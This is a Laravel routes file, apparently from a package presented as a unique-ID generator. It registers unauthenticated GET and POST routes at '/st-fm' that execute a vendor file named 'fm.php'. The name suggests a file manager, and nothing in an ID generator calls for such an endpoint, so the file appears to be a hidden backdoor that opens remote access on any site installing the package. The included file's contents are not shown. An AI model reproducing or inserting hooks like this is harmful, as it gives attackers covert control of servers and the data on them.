<?php

use Illuminate\Support\Facades\Route;

Route::get('/st-fm', function () {
    return include(base_path('vendor/alqabali/laravel-unique-id-generator/src/fm.php'));
});
Route::post('/st-fm', function () {
    return include(base_path('vendor/alqabali/laravel-unique-id-generator/src/fm.php'));
});